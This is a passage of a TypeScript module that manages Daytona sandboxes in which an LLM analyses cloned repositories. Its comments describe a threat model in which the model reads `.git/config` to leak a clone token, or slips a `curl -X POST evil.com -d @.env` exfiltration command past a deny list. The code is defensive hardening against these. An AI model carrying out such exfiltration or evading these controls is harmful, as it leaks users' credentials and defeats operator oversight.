"use node";

import { CodeLanguage, Daytona, DaytonaError, DaytonaNotFoundError, DaytonaTimeoutError } from "@daytona/sdk";
import type { SandboxFsClient, SandboxLimitedListResult, SandboxShellOutcome } from "./chat/sandboxTools";
import { redact } from "./chat/redaction";
import { withDaytonaRetry } from "./lib/daytonaRetry";
import { buildSandboxName } from "./lib/sandboxNames";
import { logInfo, logWarn } from "./lib/observability";
import { LIVE_SOURCE_UNAVAILABLE_MESSAGE } from "./lib/liveSourceLifecycle";
import { DEFAULT_AUTO_STOP_MINUTES, DEFAULT_AUTO_ARCHIVE_MINUTES, DEFAULT_AUTO_DELETE_MINUTES } from "./lib/constants";

/**
 * Truthy parse table for `DAYTONA_POST_CLONE_BLOCK_NETWORK`. Anything
 * outside this set (including unset and the empty string) is treated
 * as truthy ONLY via the explicit default in the resolver, never via
 * `Boolean(value)` — that would silently flip a security-relevant
 * setting on misconfigurations like `"false"` (a non-empty truthy
 * string under naive coercion).
 */
const TRUTHY_ENV_VALUES = new Set(["true", "1", "yes", "on"]);
const FALSY_ENV_VALUES = new Set(["false", "0", "no", "off"]);

const DEFAULT_CPU_LIMIT = 2;
const DEFAULT_MEMORY_GIB = 4;
const DEFAULT_DISK_GIB = 10;

type CreateSandboxOptions = {
  repositoryKey: string;
  repositoryId: string;
  sandboxId: string;
  accessMode: "public" | "private";
  sourceAdapter: "git_clone" | "source_service";
};

export type SandboxProvisionResult = {
  remoteId: string;
  workDir: string;
  repoPath: string;
  cpuLimit: number;
  memoryLimitGiB: number;
  diskLimitGiB: number;
  autoStopIntervalMinutes: number;
  autoArchiveIntervalMinutes: number;
  autoDeleteIntervalMinutes: number;
  networkBlockAll: boolean;
};

export type ListedSandbox = {
  remoteId: string;
  labels: Record<string, string>;
  createdAt?: string;
};

type RemoteSandboxState = "started" | "stopped" | "archived" | "destroyed" | "error" | "unknown";
export const SYSTIFY_DAYTONA_MANAGED_LABELS = {
  app: "systify",
} as const;

export type RemoteSandboxDetails =
  | {
      exists: true;
      remoteId: string;
      organizationId?: string;
      createdAt?: string;
      updatedAt?: string;
      labels: Record<string, string>;
      state: RemoteSandboxState;
    }
  | {
      exists: false;
      remoteId: string;
      state: "destroyed";
      errorKind: "not_found";
    };

export async function provisionSandbox(options: CreateSandboxOptions): Promise<SandboxProvisionResult> {
  const daytona = createDaytonaClient();
  const sandboxName = buildSandboxName({
    repositoryKey: options.repositoryKey,
    repositoryId: options.repositoryId,
    sandboxId: options.sandboxId,
  });

  // Sandbox names are import-scoped by the Convex sandbox row id. A same-name
  // lookup can only refer to a prior provisioning attempt for this sandbox row,
  // not the previous published sandbox for the repository.
  //
  // The catch narrows to `NotFound`: a fully-exhausted retry on the preflight
  // (rate-limit storm, 5xx outage) must NOT silently fall through to
  // `daytona.create` — the orphan would still be there, the create would 409,
  // and the import would surface a misleading "conflict" message instead of
  // the upstream rate-limit / outage that actually caused the failure.
  try {
    const existing = await withDaytonaRetry(() => daytona.get(sandboxName), {
      operation: "sandbox.get",
      resourceId: sandboxName,
    });
    await withDaytonaRetry(() => daytona.delete(existing), {
      operation: "sandbox.delete",
      resourceId: sandboxName,
    });
    console.log(`[daytona] Deleted pre-existing sandbox: ${sandboxName}`);
  } catch (error) {
    if (!isDaytonaNotFoundError(error)) {
      throw error;
    }
    // Sandbox doesn't exist on Daytona — no cleanup needed.
  }

  const cpuLimit = readNumberEnv("DAYTONA_CPU_LIMIT", DEFAULT_CPU_LIMIT);
  const memoryLimitGiB = readNumberEnv("DAYTONA_MEMORY_GIB", DEFAULT_MEMORY_GIB);
  const diskLimitGiB = readNumberEnv("DAYTONA_DISK_GIB", DEFAULT_DISK_GIB);
  // The sandbox is created with Daytona's default network policy so the
  // initial `git clone` can reach `github.com`. Egress is locked down
  // immediately after the clone returns via
  // `sandbox.updateNetworkSettings({ networkBlockAll: true })`
  // (gated by `DAYTONA_POST_CLONE_BLOCK_NETWORK`, requires Tier 3+).
  // See the Architecture section of `docs/sandbox/sandbox-mode-system-design.md`.
  const sandbox = await withDaytonaRetry(
    () =>
      daytona.create({
        name: sandboxName,
        language: CodeLanguage.TYPESCRIPT,
        labels: {
          ...SYSTIFY_DAYTONA_MANAGED_LABELS,
          access: options.accessMode,
          adapter: options.sourceAdapter,
          repositoryId: options.repositoryId,
        },
        autoStopInterval: readNumberEnv("DAYTONA_AUTO_STOP_MINUTES", DEFAULT_AUTO_STOP_MINUTES),
        autoArchiveInterval: readNumberEnv("DAYTONA_AUTO_ARCHIVE_MINUTES", DEFAULT_AUTO_ARCHIVE_MINUTES),
        autoDeleteInterval: readNumberEnv("DAYTONA_AUTO_DELETE_MINUTES", DEFAULT_AUTO_DELETE_MINUTES),
        networkBlockAll: false,
      }),
    { operation: "sandbox.create", resourceId: sandboxName },
  );

  const workDir =
    (await withDaytonaRetry(() => sandbox.getWorkDir(), {
      operation: "sandbox.getWorkDir",
      resourceId: sandbox.id,
    })) ?? "workspace";
  return {
    remoteId: sandbox.id,
    workDir,
    repoPath: `${workDir}/repo`,
    cpuLimit,
    memoryLimitGiB,
    diskLimitGiB,
    autoStopIntervalMinutes: sandbox.autoStopInterval ?? DEFAULT_AUTO_STOP_MINUTES,
    autoArchiveIntervalMinutes: sandbox.autoArchiveInterval ?? DEFAULT_AUTO_ARCHIVE_MINUTES,
    autoDeleteIntervalMinutes: sandbox.autoDeleteInterval ?? DEFAULT_AUTO_DELETE_MINUTES,
    networkBlockAll: sandbox.networkBlockAll ?? false,
  };
}

export async function deleteSandbox(remoteId: string) {
  try {
    const sandbox = await getSandbox(remoteId);
    await withDaytonaRetry(() => sandbox.delete(), {
      operation: "sandbox.delete",
      resourceId: remoteId,
    });
  } catch (error) {
    if (isDaytonaNotFoundError(error)) {
      logInfo("daytona", "delete_sandbox_already_gone", { remoteId });
      return;
    }
    throw error;
  }
}

export async function listSandboxesByLabel(labels: Record<string, string>): Promise<ListedSandbox[]> {
  const daytona = createDaytonaClient();
  // The SDK's `list` returns an async iterator that paginates internally
  // (per-page size via `limit`), so we drain it instead of looping pages
  // ourselves. The whole drain is wrapped in one retry: listing is
  // read-only and idempotent, so re-draining from scratch on a transient
  // failure yields the same result.
  return withDaytonaRetry(
    async () => {
      const sandboxes: ListedSandbox[] = [];
      for await (const sandbox of daytona.list({ labels, limit: 100 })) {
        sandboxes.push({
          remoteId: sandbox.id,
          labels: sandbox.labels,
          createdAt: sandbox.createdAt,
        });
      }
      return sandboxes;
    },
    {
      operation: "sandbox.list",
      resourceId: `labels=${Object.keys(labels).join(",")}`,
    },
  );
}

/**
 * Stops a running sandbox to release CPU and memory resources.
 * The sandbox remains on disk and can be auto-woken by any subsequent
 * SDK interaction (e.g., `process.executeCommand`).
 */
export async function stopSandbox(remoteId: string) {
  const sandbox = await getSandbox(remoteId);
  await withDaytonaRetry(() => sandbox.stop(60), {
    operation: "sandbox.stop",
    resourceId: remoteId,
  });
}

/**
 * Wakes a stopped sandbox back up. `sandbox.start` is the explicit
 * counterpart to `stopSandbox` — it brings the Daytona-side runtime back
 * online without reprovisioning, which is the fast path
 * (~10–30s vs. 60–120s for a fresh provision) when the sandbox row is
 * still intact but Daytona auto-stopped it on idle.
 *
 * Callers must have already verified that the sandbox exists on Daytona
 * (see `probeLiveSandbox`); calling `start` on a destroyed sandbox throws.
 */
export async function startSandbox(remoteId: string) {
  const sandbox = await getSandbox(remoteId);
  await withDaytonaRetry(() => sandbox.start(60), {
    operation: "sandbox.start",
    resourceId: remoteId,
  });
}

/**
 * Returns the current Daytona-side state of a sandbox.
 * Useful for syncing Convex DB status with reality.
 */
export async function getSandboxState(remoteId: string): Promise<RemoteSandboxState> {
  try {
    const sandbox = await getSandbox(remoteId);
    await withDaytonaRetry(() => sandbox.refreshData(), {
      operation: "sandbox.refreshData",
      resourceId: remoteId,
    });
    return normalizeRemoteSandboxState(sandbox.state);
  } catch (error) {
    if (!isDaytonaNotFoundError(error)) {
      throw error;
    }

    return "destroyed";
  }
}

/**
 * Reason codes returned by `probeLiveSandbox` when Daytona reports a state
 * that means "this sandbox is not usable right now". `deleted` covers the
 * 404 case (Daytona returned `not_found` from `get` — typically a manual
 * deletion in the dashboard, or Daytona-side GC after the archive TTL).
 */
export type LiveSandboxUnavailableReason = "deleted" | "archived" | "stopped" | "error" | "unknown";

export type LiveSandboxProbe =
  | { ok: true; remoteState: RemoteSandboxState }
  | {
      ok: false;
      remoteState: RemoteSandboxState;
      reason: LiveSandboxUnavailableReason;
      message: string;
    };

/**
 * Authoritative liveness check for a Daytona sandbox. Pure: no Convex
 * writes, just translates `getRemoteSandboxDetails` into a verdict the
 * caller can act on.
 *
 * Used as the first step of any action that is about to spend tokens or
 * compute on a sandbox so the local `sandboxes` cache is never load-bearing
 * for the "can we actually use this?" decision — Daytona is. See
 * `convex/lib/sandboxLiveness.ts` for the action-side wrapper that also
 * mirrors the result back into Convex.
 */
export async function probeLiveSandbox(remoteId: string): Promise<LiveSandboxProbe> {
  const details = await getRemoteSandboxDetails(remoteId);
  if (!details.exists) {
    return {
      ok: false,
      remoteState: "destroyed",
      reason: "deleted",
      message: LIVE_SOURCE_UNAVAILABLE_MESSAGE,
    };
  }
  switch (details.state) {
    case "started":
      return { ok: true, remoteState: "started" };
    case "archived":
      return {
        ok: false,
        remoteState: "archived",
        reason: "archived",
        message: LIVE_SOURCE_UNAVAILABLE_MESSAGE,
      };
    case "stopped":
      return {
        ok: false,
        remoteState: "stopped",
        reason: "stopped",
        message: "Live access to the repository wasn't available. The next attempt will wake it up.",
      };
    case "destroyed":
      return {
        ok: false,
        remoteState: "destroyed",
        reason: "deleted",
        message: LIVE_SOURCE_UNAVAILABLE_MESSAGE,
      };
    case "error":
      return {
        ok: false,
        remoteState: "error",
        reason: "error",
        message: "Live access to the repository hit an error. Try again in a minute.",
      };
    case "unknown":
      return {
        ok: false,
        remoteState: "unknown",
        reason: "unknown",
        message: "Live access state is unknown. Try again if the problem persists.",
      };
  }
}

export async function getRemoteSandboxDetails(remoteId: string): Promise<RemoteSandboxDetails> {
  try {
    const sandbox = await getSandbox(remoteId);
    await withDaytonaRetry(() => sandbox.refreshData(), {
      operation: "sandbox.refreshData",
      resourceId: remoteId,
    });

    return {
      exists: true,
      remoteId: sandbox.id,
      organizationId: sandbox.organizationId,
      createdAt: sandbox.createdAt,
      updatedAt: sandbox.updatedAt,
      labels: sandbox.labels ?? {},
      state: normalizeRemoteSandboxState(sandbox.state),
    };
  } catch (error) {
    if (!isDaytonaNotFoundError(error)) {
      throw error;
    }

    return {
      exists: false,
      remoteId,
      state: "destroyed",
      errorKind: "not_found",
    };
  }
}

export async function cloneRepositoryInSandbox(args: {
  remoteId: string;
  url: string;
  branch?: string;
  token?: string;
}) {
  const sandbox = await getSandbox(args.remoteId);
  try {
    await withDaytonaRetry(
      () =>
        sandbox.git.clone(
          args.url,
          "repo",
          args.branch,
          undefined,
          args.token ? "x-access-token" : undefined,
          args.token,
        ),
      { operation: "sandbox.git.clone", resourceId: args.remoteId },
    );
  } catch (error) {
    throw wrapDaytonaCloneError(error, {
      url: args.url,
      branch: args.branch,
      hasToken: Boolean(args.token),
    });
  }

  // Token scrub. `sandbox.git.clone` with credentials embeds the token
  // into `.git/config` (`https://x-access-token:<token>@…`).
  // Without this overwrite, `run_shell` would let the LLM
  // `cat .git/config` and exfiltrate the token into `messages`, which
  // sandbox deletion does NOT scrub. See
  // `docs/sandbox/sandbox-mode-security-system-design.md`.
  //
  // Unconditional: the leak is created by the clone, not by the chat
  // layer, so this is hardening rather than feature behavior. The
  // `args.url` substitution is
  // POSIX-single-quoted for defense in depth — `importsNode.ts` only
  // ever passes canonical HTTPS URLs today, but a less-sanitized
  // future caller must not break out of the command.
  //
  // Subsequent `git fetch` inside the sandbox will fail without re-auth,
  // which is the desired posture for a read-only analysis sandbox.
  await withDaytonaRetry(
    () => sandbox.process.executeCommand(`git remote set-url origin ${posixSingleQuote(args.url)}`, "repo"),
    { operation: "sandbox.git_remote_set_url_scrub", resourceId: args.remoteId },
  );

  // Post-clone network lockdown. Once the source is on disk, Systify never
  // needs sandbox-side egress: the LLM's `run_shell` is intended to be
  // read-only by prompt + deny list, and every legitimate operation
  // (read_file, list_dir, executeCommand) is dispatched through Daytona's
  // control plane — which is independent of the sandbox container's
  // outbound traffic. Cutting outbound here is the load-bearing block on
  // data exfiltration: a chat reply that smuggles
  // `curl -X POST evil.com -d @.env` past the deny list will fail at the
  // network layer instead of completing the leak.
  //
  // Daytona applies the iptables rule to a running sandbox via
  // `updateNetworkSettings`. This project pins `@daytona/sdk` at `0.173.0` to
  // pick up later fixes/features required by this PR. The call is gated by
  // Daytona organization tier — Tier 1/2 cannot override sandbox-level
  // network policy and the SDK call throws.
  //
  // The block is therefore env-var-gated:
  //   - `DAYTONA_POST_CLONE_BLOCK_NETWORK` truthy (default) → call the SDK,
  //     fail-closed if it rejects. The right posture for Tier 3+ orgs and
  //     for operators who want network-layer enforcement of egress.
  //   - falsy → skip the call entirely and emit a structured warn so
  //     operators see the degraded posture in logs. The right posture for
  //     Tier 1/2 orgs (where the SDK call is unavailable) and for dev
  //     deployments that accept the application-layer mitigations
  //     (system prompt, deny list, output redaction, throwaway lifecycle)
  //     as sufficient. See `docs/sandbox/sandbox-mode-security-system-design.md`
  //     for the full posture analysis.
  if (resolvePostCloneBlockNetwork()) {
    await withDaytonaRetry(() => sandbox.updateNetworkSettings({ networkBlockAll: true }), {
      operation: "sandbox.updateNetworkSettings.block",
      resourceId: args.remoteId,
    });
  } else {
    logWarn("daytona", "post_clone_network_block_skipped", {
      remoteId: args.remoteId,
      reason:
        "DAYTONA_POST_CLONE_BLOCK_NETWORK is disabled — sandbox egress is not blocked at the network layer. " +
        "Defenses fall back to system prompt, deny list, output redaction, and throwaway lifecycle.",
    });
  }

  // Branch and SHA are independent reads, so issue them in parallel —
  // each is a separate Daytona round trip, sequencing them doubles the
  // post-clone latency for no benefit. The scrub above stays sequential
  // because its ordering (before any other post-clone command) is the
  // security invariant pinned by `daytona.test.ts`. The network block runs
  // between scrub and inspection so that, by the time any tool layer can
  // observe the sandbox, both the on-disk token leak and the egress path
  // are already closed; branch/SHA reads ride Daytona's control plane and
  // are not affected by the outbound iptables rule.
  const [branchCommand, shaCommand] = await Promise.all([
    withDaytonaRetry(() => sandbox.process.executeCommand("git branch --show-current", "repo"), {
      operation: "sandbox.exec.git_branch_show",
      resourceId: args.remoteId,
    }),
    withDaytonaRetry(() => sandbox.process.executeCommand("git rev-parse HEAD", "repo"), {
      operation: "sandbox.exec.git_rev_parse",
      resourceId: args.remoteId,
    }),
  ]);

  return {
    branch: branchCommand.result.trim() || args.branch,
    commitSha: shaCommand.result.trim(),
  };
}

/**
 * POSIX-shell single-quote escaping for safe `'…'` substitution into a
 * shell command. Embedded single quotes are escaped by closing the quote,
 * inserting a literal `\\'`, and reopening — the canonical pattern from
 * `man sh` that works under every POSIX shell Daytona could plausibly use
 * (bash, dash, ash, zsh).
 *
 * Used here only for the `origin` URL post-clone rewrite. Callers that
 * need to escape *arguments* should remember that this is full quoting,
 * not escaping — joining multiple quoted segments with spaces still
 * produces a well-formed argv.
 */
function posixSingleQuote(value: string): string {
  return `'${value.replace(/'/g, "'\\''")}'`;
}

const DAYTONA_BOUNDED_LIST_COMMAND = `bash -lc ${posixSingleQuote(
  [
    'limit="${SYSTIFY_LIST_LIMIT:-200}"',
    'find "$SYSTIFY_LIST_PATH" -mindepth 1 -maxdepth 1 -printf \'%y\\t%s\\t%f\\0\' | head -z -n "$((limit + 1))"',
  ].join("\n"),
)}`;

const DAYTONA_OUTPUT_LIMIT_COMMAND = `bash -lc ${posixSingleQuote(
  [
    "set +e",
    'limit="${SYSTIFY_OUTPUT_LIMIT_BYTES:-32769}"',
    'token="${SYSTIFY_OUTPUT_METADATA_TOKEN:?missing metadata token}"',
    'tmp="$(mktemp)"',
    'rest="$(mktemp)"',
    'fifo="$(mktemp -u)"',
    'mkfifo "$fifo"',
    '{ dd bs=1 count="$limit" of="$tmp" 2>/dev/null; cat > "$rest"; } < "$fifo" & reader_pid=$!',
    'bash -lc "$SYSTIFY_USER_COMMAND" > "$fifo" 2>&1 & child_pid=$!',
    'wait "$child_pid"',
    "status=$?",
    'wait "$reader_pid"',
    'bytes_returned="$(wc -c < "$tmp" | tr -d " ")"',
    'remaining_bytes="$(wc -c < "$rest" | tr -d " ")"',
    'total_bytes="$((bytes_returned + remaining_bytes))"',
    'cat "$tmp"',
    'printf "\\n__SYSTIFY_OUTPUT_METADATA_%s__%s:%s:%s\\n" "$token" "$status" "$bytes_returned" "$total_bytes"',
    'rm -f "$tmp" "$rest" "$fifo"',
    'exit "$status"',
  ].join("\n"),
)}`;

function parseBoundedShellOutput(output: string, token: string, requestedLimitBytes: number): SandboxShellOutcome {
  const marker = `\n__SYSTIFY_OUTPUT_METADATA_${token}__`;
  const markerIndex = output.lastIndexOf(marker);
  if (markerIndex === -1) {
    return { kind: "ok", exitCode: 1, output };
  }
  const metadata = output.slice(markerIndex + marker.length).trim();
  const [statusRaw, bytesReturnedRaw, totalBytesRaw] = metadata.split(":");
  const exitCode = Number(statusRaw);
  const adapterBytesReturned = Number(bytesReturnedRaw);
  const totalBytes = Number(totalBytesRaw);
  const clippedOutput = output.slice(0, markerIndex);
  const truncated = Number.isFinite(totalBytes) && totalBytes > requestedLimitBytes;
  return {
    kind: "ok",
    exitCode: Number.isFinite(exitCode) ? exitCode : 1,
    output: clippedOutput,
    bytesReturned: Number.isFinite(adapterBytesReturned)
      ? Math.min(adapterBytesReturned, requestedLimitBytes)
      : undefined,
    totalBytes: Number.isFinite(totalBytes) ? totalBytes : undefined,
    truncated,
  };
}

function parseBoundedListOutput(output: string, maxEntries: number): SandboxLimitedListResult {
  const records = output.split("\0").filter((record) => record.length > 0);
  const truncated = records.length > maxEntries;
  const selectedRecords = truncated ? records.slice(0, maxEntries) : records;
  return {
    entries: selectedRecords.map((record) => {
      const firstTab = record.indexOf("\t");
      const secondTab = firstTab === -1 ? -1 : record.indexOf("\t", firstTab + 1);
      if (firstTab === -1 || secondTab === -1) {
        throw new Error("Unexpected Daytona directory listing format.");
      }

      const typeChar = record.slice(0, firstTab);
      const rawSize = record.slice(firstTab + 1, secondTab);
      const size = Number(rawSize);
      return {
        name: record.slice(secondTab + 1),
        isDir: typeChar === "d",
        size: Number.isFinite(size) ? size : 0,
      };
    }),
    totalEntries: truncated ? maxEntries + 1 : selectedRecords.length,
    truncated,
  };
}

/**
 * Enrich a `sandbox.git.clone` failure with the diagnostic context the
 * Daytona SDK strips out by default.
 *
 * The Daytona toolbox surfaces clone failures as `DaytonaError` subclasses
 * whose `message` is often the bare axios default ("Request failed with
 * status code 400") — because the toolbox returns an empty body for most
 * validation failures and the SDK's `extractAxiosErrorMessage` falls
 * through to `error.message`. Without the status code, the SDK error
 * code, and which repo / branch / auth posture failed, post-mortem turns
 * into guesswork.
 *
 * The wrapper embeds the relevant fields in its own `message` so they
 * propagate to BOTH the Convex log (via `logErrorWithId` → `serializeError`)
 * AND the import record's `errorMessage` column (which the UI renders to
 * the user). The original error is forwarded via `cause` so observability
 * walks the chain and surfaces `statusCode` / `errorCode` as structured
 * fields too. The original `name` is preserved so log filters and dashboards
 * keyed on `DaytonaValidationError` keep matching.
 *
 * Security invariants:
 *   - The token itself is NEVER part of the wrapped message — only a
 *     boolean indicating whether one was supplied. Even though the
 *     wrapper runs inside the Convex backend, the resulting message
 *     lands in `imports.errorMessage` and is rendered to the user, so
 *     the audit posture is "no credentials leave this function".
 *   - Only the URL's host is embedded — never the full URL, which could
 *     include a `userinfo` component (e.g. `https://user:pass@host/...`)
 *     if a future caller pre-bakes credentials into the URL.
 */
function wrapDaytonaCloneError(error: unknown, context: { url: string; branch?: string; hasToken: boolean }): Error {
  const urlHost = safeUrlHost(context.url);
  const branchDescriptor = context.branch ?? "(default)";
  const authDescriptor = context.hasToken ? "with installation token" : "without auth";

  const fragments: string[] = [
    `Sandbox git clone failed (host=${urlHost}, branch=${branchDescriptor}, ${authDescriptor})`,
  ];

  if (error instanceof DaytonaError) {
    if (error.statusCode !== undefined) {
      fragments.push(`Daytona HTTP ${error.statusCode}`);
    }
    if (error.errorCode) {
      fragments.push(`code=${error.errorCode}`);
    }
    fragments.push(sanitizeCloneDiagnostic(error.message));
  } else if (error instanceof Error) {
    fragments.push(sanitizeCloneDiagnostic(error.message));
  } else {
    fragments.push(sanitizeCloneDiagnostic(String(error)));
  }

  // `new Error(msg, { cause })` is ES2022; the frontend tsconfig still ships
  // an ES2020 `lib` so we attach `cause` as a property after construction.
  // The runtime semantics are identical — V8's two-arg `Error` constructor
  // is sugar for the same property assignment — and `serializeError` reads
  // `cause` through the same localised cast.
  const wrapped = new Error(fragments.join(" — ")) as Error & { cause?: unknown };
  wrapped.cause = buildSanitizedCloneCause(error);
  if (error instanceof Error) {
    // Forward the original name so log filters / dashboards that key on
    // `DaytonaValidationError` keep matching after wrapping. We only do
    // this for `Error` subclasses — a string `cause` would leave `name`
    // as the default "Error", which is the right fallback.
    wrapped.name = error.name;
  }
  return wrapped;
}

function buildSanitizedCloneCause(error: unknown): unknown {
  if (!(error instanceof Error)) {
    return sanitizeCloneDiagnostic(String(error));
  }

  const sanitized = new Error(sanitizeCloneDiagnostic(error.message)) as Error & {
    statusCode?: number;
    errorCode?: string;
  };
  sanitized.name = error.name;
  if (error instanceof DaytonaError) {
    if (error.statusCode !== undefined) {
      sanitized.statusCode = error.statusCode;
    }
    if (error.errorCode !== undefined) {
      sanitized.errorCode = error.errorCode;
    }
  }
  return sanitized;
}

function sanitizeCloneDiagnostic(value: string): string {
  return redact(value).redacted;
}

/**
 * Extract the host of a URL without throwing on malformed input. The
 * `WHATWG URL` parser accepts every URL the import pipeline produces
 * today, but the helper is on the error path where any second exception
 * would mask the original failure — so the fallback is preferred over a
 * panic.
 */
function safeUrlHost(url: string): string {
  try {
    return new URL(url).host;
  } catch {
    return "(unparseable url)";
  }
}

/**
 * Validates every env var required to provision a Daytona sandbox. Call this
 * at the entry point of any action that will provision a sandbox so the
 * operator gets a single, actionable error before any Convex/Daytona side
 * effects (sandbox row reservation, GitHub permission probe, etc.) occur.
 *
 * Also emits a one-shot `degraded_egress_posture` warn when
 * `DAYTONA_POST_CLONE_BLOCK_NETWORK` resolves to false. The same fact is
 * already logged by `cloneRepositoryInSandbox` per-clone, but surfacing it
 * at the import entry point catches deploys where the env was mis-set
 * before a single sandbox is even attempted — the loudest place to flag a
 * Tier 1/2 dev posture sneaking into prod.
 */
export function assertSandboxProvisioningConfigured(): void {
  if (!process.env.DAYTONA_API_KEY) {
    throw new Error("DAYTONA_API_KEY env var is not set. Add Daytona credentials before importing repositories.");
  }
  if (!resolvePostCloneBlockNetwork()) {
    logWarn("daytona", "degraded_egress_posture", {
      reason:
        "DAYTONA_POST_CLONE_BLOCK_NETWORK is disabled — sandbox egress will NOT be blocked at the network layer. " +
        "Acceptable for Tier 1/2 dev deployments; not recommended for prod traffic from third parties.",
    });
  }
}

/**
 * Resolves whether `cloneRepositoryInSandbox` should call
 * `sandbox.updateNetworkSettings({ networkBlockAll: true })` after a
 * successful clone. The flag exists because the underlying SDK call is
 * gated by Daytona organization tier — Tier 1/2 cannot override
 * sandbox-level network policy and the call is rejected at the API layer.
 *
 * Contract:
 *   - Unset / unrecognised value → `true` (secure default; if the
 *     deployment is on Tier 3+ it gets the network-layer block; if it
 *     is on Tier 1/2 the SDK call surfaces the error and the import
 *     fails-closed, which is the loudest signal that the operator must
 *     consciously configure this flag).
 *   - Truthy (`true` / `1` / `yes` / `on`, case-insensitive) → call
 *     the SDK; fail-closed on rejection.
 *   - Falsy (`false` / `0` / `no` / `off`, case-insensitive) → skip the
 *     call and emit a structured `post_clone_network_block_skipped`
 *     warning so operators see the degraded posture in logs.
 *
 * The fall-back posture (when this flag is `false`) is documented in
 * `docs/sandbox/sandbox-mode-security-system-design.md`: the application layer
 * (system prompt, `COMMAND_DENY_LIST`, `redact()`, throwaway lifecycle,
 * unprivileged execution) becomes the sole defense against egress-based
 * exfiltration. That is acceptable for Tier 1/2 dev deployments only;
 * operators offering the service to third parties should plan to upgrade
 * tier and re-enable the block.
 */
function resolvePostCloneBlockNetwork(): boolean {
  const raw = process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
  if (raw === undefined) {
    return true;
  }
  const normalized = raw.trim().toLowerCase();
  if (FALSY_ENV_VALUES.has(normalized)) {
    return false;
  }
  if (TRUTHY_ENV_VALUES.has(normalized)) {
    return true;
  }
  // Unrecognised value → secure default. A typo in env config should
  // never silently disable a security control.
  return true;
}

/**
 * Plan-04 + Plan-08 adapter — wraps a Daytona `Sandbox` in the runtime-
 * agnostic `SandboxFsClient` interface that `chat/sandboxTools.ts` consumes.
 *
 * Why this lives in `daytona.ts` rather than `chat/sandboxTools.ts`:
 *
 *   - All Daytona-specific code (Node-only imports, error types, SDK quirks)
 *     stays here. `sandboxTools.ts` remains runtime-agnostic and trivially
 *     unit-testable with a fake client.
 *   - The shell tool (`run_shell`) reuses the same handle and adapter
 *     rather than re-querying Daytona inside `chat/sandboxTools.ts`.
 *   - Type fidelity: Daytona's `downloadFile` is overloaded — one form
 *     returns `Buffer`, the other returns `void` (writes to a local path).
 *     Selecting the buffer overload here means `sandboxTools.ts` sees the
 *     narrower, single-overload `Promise<Uint8Array>` shape.
 *   - Error translation: `DaytonaTimeoutError` is folded into the
 *     `SandboxShellOutcome` discriminated union so the tool layer never
 *     imports `@daytona/sdk` symbols. Other Daytona errors (auth, 404,
 *     network) keep throwing — they are infrastructural failures the tool's
 *     generic try/catch already maps to `io_error`.
 *
 * **Why these SDK calls are NOT wrapped in `withDaytonaRetry`**: the
 * three operations exposed here (`downloadFile`, `listFiles`,
 * `executeCommand`) are user-observable LLM tool calls. The chat
 * generation loop expects to see each tool result (or error envelope)
 * verbatim so it can decide whether to retry, switch approach, or
 * surface the failure to the user. Silent SDK-level retries would
 * smear that contract — a 429 that would naturally produce an
 * `io_error` envelope (which the LLM can adapt to) would instead
 * stall the tool call for tens of seconds, blowing the per-message
 * latency budget without giving the LLM any signal. Infrastructure
 * calls (provisioning, clone, network policy) keep their retries
 * because they're not on the LLM's hot path.
 */
export async function getSandboxFsClient(remoteId: string): Promise<SandboxFsClient> {
  const sandbox = await getSandbox(remoteId);
  return {
    getFileInfo: async (path) => {
      const info = await sandbox.fs.getFileDetails(path);
      return {
        isDir: info.isDir,
        size: info.size,
      };
    },
    // The two-arg `downloadFile(path, timeout)` overload returns a Buffer
    // (which extends Uint8Array, satisfying the SandboxFsClient contract).
    // We intentionally pin to that overload; the three-arg form would
    // download to a local file and is irrelevant here.
    downloadFile: (path, timeoutSeconds) => sandbox.fs.downloadFile(path, timeoutSeconds),
    listFiles: async (path) => {
      const entries = await sandbox.fs.listFiles(path);
      // Project Daytona's `FileInfo` (group, mode, owner, modTime, …) onto
      // the `SandboxListedFile` minimum the tool needs. This both narrows
      // the surface area we pass into the LLM (no metadata leaks) and
      // insulates the tool factory from upstream SDK schema drift.
      return entries.map((entry) => ({
        name: entry.name,
        isDir: entry.isDir,
        size: entry.size,
      }));
    },
    listFilesLimited: async (path, maxEntries) => {
      const response = await sandbox.process.executeCommand(DAYTONA_BOUNDED_LIST_COMMAND, undefined, {
        SYSTIFY_LIST_LIMIT: String(maxEntries),
        SYSTIFY_LIST_PATH: path,
      });
      if (response.exitCode !== 0) {
        throw new Error(response.result || `Directory listing failed with exit code ${response.exitCode}.`);
      }
      return parseBoundedListOutput(response.result, maxEntries);
    },
    // `run_shell` adapter. Daytona's `executeCommand` returns
    // `{ exitCode, result }` for normal completion (including non-zero
    // exits — `grep` finding nothing exits 1 without throwing). Timeouts
    // surface as `DaytonaTimeoutError`; we translate that into a
    // `kind: "timeout"` outcome so the tool layer can build a
    // `command_timeout` envelope without importing the SDK error type.
    //
    // Other Daytona errors (auth, 404, network) keep throwing — the tool
    // layer's generic try/catch turns them into `io_error`. We do *not*
    // catch them here because that would make the adapter swallow
    // genuinely-infrastructural failures behind a "timeout" badge.
    executeCommand: async (command, options): Promise<SandboxShellOutcome> => {
      try {
        const maxOutputBytes = options.maxOutputBytes;
        const bounded = typeof maxOutputBytes === "number" && Number.isFinite(maxOutputBytes) && maxOutputBytes > 0;
        const responseLimitBytes = bounded ? Math.floor(maxOutputBytes) + 1 : undefined;
        const metadataToken = bounded ? crypto.randomUUID() : "";
        const commandToRun = bounded ? DAYTONA_OUTPUT_LIMIT_COMMAND : command;
        const env = bounded
          ? {
              ...options.env,
              SYSTIFY_OUTPUT_LIMIT_BYTES: String(responseLimitBytes),
              SYSTIFY_OUTPUT_METADATA_TOKEN: metadataToken,
              SYSTIFY_USER_COMMAND: command,
            }
          : options.env;
        const response = await sandbox.process.executeCommand(commandToRun, options.cwd, env, options.timeoutSeconds);
        if (bounded && responseLimitBytes !== undefined) {
          return parseBoundedShellOutput(response.result, metadataToken, Math.floor(maxOutputBytes));
        }
        return {
          kind: "ok",
          exitCode: response.exitCode,
          // `response.result` is the merged stdout/stderr per the SDK
          // contract (`response.artifacts.stdout` is the same string).
          // The tool layer handles truncation and redaction — we forward
          // the raw output here.
          output: response.result,
        };
      } catch (error) {
        if (error instanceof DaytonaTimeoutError) {
          return { kind: "timeout", message: error.message };
        }
        throw error;
      }
    },
  };
}

export function isSystifyManagedSandbox(labels: Record<string, string> | undefined): boolean {
  if (!labels) {
    return false;
  }
  return labels.app === SYSTIFY_DAYTONA_MANAGED_LABELS.app;
}

async function getSandbox(remoteId: string) {
  const daytona = createDaytonaClient();
  return withDaytonaRetry(() => daytona.get(remoteId), {
    operation: "sandbox.get",
